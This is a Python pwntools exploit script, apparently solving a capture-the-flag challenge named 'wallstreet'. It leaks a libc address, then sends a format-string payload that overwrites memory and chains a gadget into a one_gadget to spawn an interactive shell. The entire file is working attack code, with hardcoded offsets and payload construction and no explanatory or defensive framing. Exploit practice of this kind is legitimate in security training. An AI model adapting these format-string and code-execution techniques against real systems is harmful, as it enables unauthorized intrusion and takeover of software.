#!/usr/bin/env python2
from pwn import *
from time import sleep

exe = ELF("./wallstreet")
libc = ELF("./libc.so.6")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"

global io
breakpoints = '''
set sysroot /
break main
break *0x4013fb
break *0x4014a7
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, env={"LD_PRELOAD":"./libc.so.6"}, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

stdout = 0x1e46c0
one_gadget = 0xdf552
gadget = 0x7aca3
#0x0000000007aca3: and al, 0x10; mov rdx, rcx; mov rsi, r12; mov rdi, rbp; call qword ptr [r14+0x38];

offset = 0x403e18
user_buf = 0x4040e0

reu("stonks!\n")
sl("1")
reu("?\n")
sl("56")

leak = unpack(re(6),48)-stdout
log.info("Libc -> "+hex(leak))

reu("?\n")

payload = "%{}c%100$n".format(user_buf-offset+11)
payload += p64(leak+gadget)
payload += "m"*0x30
payload += p64(leak+one_gadget)

s(payload)

io.interactive()